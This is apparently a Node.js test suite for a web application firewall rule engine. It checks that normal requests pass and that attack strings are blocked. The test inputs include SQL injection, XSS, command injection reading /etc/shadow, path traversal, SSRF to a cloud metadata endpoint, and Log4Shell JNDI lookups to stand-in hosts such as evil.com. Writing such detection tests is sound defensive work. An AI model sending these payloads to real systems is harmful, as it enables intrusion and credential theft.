/**
 * Proxy Behavior Tests
 * 
 * Tests the WAF rule engine in different operational modes:
 *   - Clean request passthrough
 *   - Attack request blocking
 *   - Whitelist exemptions
 *   - Rule engine inspection accuracy
 */

const { describe, it } = require('node:test');
const assert = require('node:assert');
const ruleEngine = require('../rule-engine');

// Helper: simulate a minimal HTTP request object
function makeReq(uri, method = 'GET', headers = {}) {
    return {
        url: uri,
        method,
        headers: {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'host': 'example.com',
            'accept': 'text/html',
            'accept-encoding': 'gzip, deflate',
            ...headers,
        },
        httpVersion: '1.1',
        connection: { remoteAddress: '203.0.113.45' },
    };
}

describe('Proxy Behavior (Rule Engine)', () => {
    describe('Clean Request Passthrough', () => {
        it('should pass a simple GET request', () => {
            const result = ruleEngine.inspect(makeReq('/'), '');
            assert.strictEqual(result, null, 'Clean GET / should pass');
        });

        it('should pass a normal page request with query params', () => {
            const result = ruleEngine.inspect(makeReq('/products?category=electronics&page=2'), '');
            assert.strictEqual(result, null, 'Normal query params should pass');
        });

        it('should pass a JSON API request', () => {
            const result = ruleEngine.inspect(
                makeReq('/api/data', 'POST', { 'content-type': 'application/json' }),
                '{"name": "John", "email": "john@example.com"}'
            );
            assert.strictEqual(result, null, 'Normal JSON POST should pass');
        });

        it('should pass common static file requests', () => {
            const paths = ['/styles.css', '/app.js', '/logo.png', '/favicon.ico'];
            for (const p of paths) {
                const result = ruleEngine.inspect(makeReq(p), '');
                assert.strictEqual(result, null, `${p} should pass`);
            }
        });
    });

    describe('SQL Injection Detection', () => {
        it('should block classic OR 1=1', () => {
            const result = ruleEngine.inspect(makeReq("/login?user=admin' OR '1'='1"), '');
            assert.ok(result, 'SQLi OR should be detected');
            assert.strictEqual(result.attackType, 'SQL Injection');
        });

        it('should block UNION SELECT', () => {
            const result = ruleEngine.inspect(makeReq('/users?id=1 UNION SELECT password FROM users'), '');
            assert.ok(result, 'UNION SELECT should be detected');
        });

        it('should block SQL comments', () => {
            const result = ruleEngine.inspect(makeReq("/page?id=1; DROP TABLE users--"), '');
            assert.ok(result, 'SQL comment attack should be detected');
        });

        it('should block SQLi in POST body', () => {
            const result = ruleEngine.inspect(
                makeReq('/api/login', 'POST'),
                "username=admin'--&password=anything"
            );
            assert.ok(result, 'SQLi in POST body should be detected');
        });
    });

    describe('XSS Detection', () => {
        it('should block script tags', () => {
            const result = ruleEngine.inspect(makeReq('/search?q=<script>alert(1)</script>'), '');
            assert.ok(result, 'Script tag XSS should be detected');
            assert.strictEqual(result.attackType, 'XSS');
        });

        it('should block event handler XSS', () => {
            const result = ruleEngine.inspect(makeReq('/page?name=<img onerror=alert(1)>'), '');
            assert.ok(result, 'Event handler XSS should be detected');
        });

        it('should block javascript: URI', () => {
            const result = ruleEngine.inspect(makeReq('/redirect?url=javascript:alert(1)'), '');
            assert.ok(result, 'javascript: URI should be detected');
        });
    });

    describe('Path Traversal Detection', () => {
        it('should block ../ traversal', () => {
            const result = ruleEngine.inspect(makeReq('/files?path=../../../../etc/passwd'), '');
            assert.ok(result, 'Path traversal should be detected');
            assert.strictEqual(result.attackType, 'Path Traversal');
        });

        it('should block encoded traversal', () => {
            const result = ruleEngine.inspect(makeReq('/files?path=%2e%2e%2f%2e%2e%2fetc/passwd'), '');
            assert.ok(result, 'Encoded path traversal should be detected');
        });

        it('should block sensitive file access', () => {
            const result = ruleEngine.inspect(makeReq('/app/../../etc/shadow'), '');
            assert.ok(result, 'Sensitive file access should be detected');
        });
    });

    describe('RCE Detection', () => {
        it('should block command injection with semicolons', () => {
            const result = ruleEngine.inspect(makeReq('/api/exec?cmd=; cat /etc/shadow'), '');
            assert.ok(result, 'Command injection should be detected');
        });

        it('should block pipe-based command injection', () => {
            const result = ruleEngine.inspect(makeReq('/api/ping?host=8.8.8.8| whoami'), '');
            assert.ok(result, 'Pipe-based command injection should be detected');
        });
    });

    describe('Log4Shell Detection', () => {
        it('should block JNDI injection in URI', () => {
            const result = ruleEngine.inspect(makeReq('/api/lookup?q=${jndi:ldap://evil.com/x}'), '');
            assert.ok(result, 'JNDI injection should be detected');
            assert.strictEqual(result.attackType, 'Log4Shell');
        });

        it('should block JNDI in request body', () => {
            const result = ruleEngine.inspect(
                makeReq('/api/data', 'POST'),
                '{"name": "${jndi:ldap://attacker.com/exploit}"}'
            );
            assert.ok(result, 'JNDI in body should be detected');
        });
    });

    describe('SSRF Detection', () => {
        it('should block internal IP access', () => {
            const result = ruleEngine.inspect(makeReq('/proxy?url=http://169.254.169.254/latest/meta-data'), '');
            assert.ok(result, 'SSRF to metadata endpoint should be detected');
        });

        it('should block localhost access', () => {
            const result = ruleEngine.inspect(makeReq('/fetch?url=http://127.0.0.1:8080/admin'), '');
            assert.ok(result, 'SSRF to localhost should be detected');
        });
    });

    describe('HTTP Smuggling Detection', () => {
        it('should block Transfer-Encoding manipulation', () => {
            const result = ruleEngine.inspect(
                makeReq('/', 'POST', {
                    'transfer-encoding': 'chunked',
                    'content-length': '10',
                }),
                'test'
            );
            assert.ok(result, 'HTTP smuggling (CL+TE) should be detected');
        });
    });

    describe('Scanner Detection', () => {
        it('should block known scanner UAs', () => {
            const result = ruleEngine.inspect(makeReq('/', 'GET', {
                'user-agent': 'Nmap Scripting Engine',
            }), '');
            assert.ok(result, 'Scanner UA should be detected');
        });
    });
});
